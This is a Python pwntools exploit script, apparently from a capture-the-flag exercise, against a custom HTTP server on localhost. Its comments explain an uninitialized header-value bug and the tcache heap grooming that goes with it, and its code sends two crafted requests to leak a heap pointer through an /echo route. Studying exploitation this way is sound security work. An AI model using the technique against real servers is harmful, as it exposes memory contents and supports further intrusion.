#!/usr/bin/env python3
from pwn import * 
p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

'''

Vulnerability
===================
When parsing a header, if there is NO 'value' in it ('AAA' instead of 'AAA:BBB')
then the header 'value_len' is initialized to be the SAME as the 'key_len'.
As a result, when using the 'value' it will be uninitialized but will attempt
to be the same as the 'key_len'. This allows for the reading of data 
from the heap without being initialized in VERY large quanities.

By using the 'echo' route, we are able to read the header value for the 
information leak.

Grooming + Exploitation
==============

The grooming really relies on understanding HOW the allocator works. 
A few things make it difficult though: 
- It's at the beginning of the program with very little control of the shape. 
- There are VERY few calls to free. It is impossible to get more than 1 chunk into
    a tcache bin at a time. 

As a result, we simply make ANOTHER connection once these chunks are in the bins. 
This way, getting a leak becomes MUCH easier in practice. Using the 'Connection'
header will help us with this. 

In the first request, we will create at least 4 headers that will end
up with key/values that are 0x20 in size. This will, we can use the 'fd' pointer
leftover for our heap leak later. After this is done, we will have at least 7 chunks in the tcache 0x20 bin
and MORE in the fastbin. Whoop whoop!

In the second request, we create a header with the uninitialized memory vulnerabiilty.
It is CRUCIAL to remember that the 'key' size of the header is the SAME allocation
size used for the 'value' of the header. So, if we create a small allocation, 
such as the '0x20' discussed above, for the 'key' it will also be used for the value. 
Additionally, this is the AMOUNT of data copied. So, we want to make sure that the 
allocation is AT LEAST 0x7 in size, in order to get the full pointer data. 

Once the allocation is made without the initialized memory, the 'fd' pointer 
is still in this memoy. As a result, the '/echo' route will display the 
heap address back to us. 
'''


## First Request is all about grooming!
## Want to create a BUNCH of chunks in the bins
line_one = b"GET /echo?A=B&req_type=header&key=DontCare&res_type=body HTTP/1.1"
p.sendline(line_one) 

# Add 10 headers to create lots of 0x20 sized chunks
# Will be lots of 0x20 chunks in the tcache bin for second request
for i in range(10):
  p.sendline(b"A:B")

p.sendline("Connection:BBBB")
p.sendline(b"")


# Get info from response. Don't care about it though.
first_line = p.recvline()
first_header = str(p.recvline())
value_of_header = first_header.split(':')[1]
content_length_value = ''.join(c for c in value_of_header if c.isdigit())
blank =  p.recvline() 
body = p.recvn(int(content_length_value)) 


####################
## Second Request ##
####################
line_one = b"GET /echo?A=B&req_type=header&key=MyHeader&res_type=body HTTP/1.1"
p.sendline(line_one) 

# Value of THIS header will not be initialized
# Allocates 0x20 sized chunk, which used to have a tcache bin fd pointer inside of it.
p.sendline(b"MyHeader") 
p.sendline(b"")


## Parse the response AND leak
## Grab and parse the 'Content-Length' header
first_line = p.recvline()
first_header = str(p.recvline())

value_of_header = first_header.split(':')[1]
content_length_value = ''.join(c for c in value_of_header if c.isdigit())

## Newline between headers and body
blank =  p.recvline() 

## The BODY of the request
body = p.recvn(int(content_length_value)) 

'''
Uninitialized memory is in the 'value' of the header within the body.
'''
value = body.split(b':')[1]

heap_leak = u64(value[0:8])
print(hex(heap_leak))
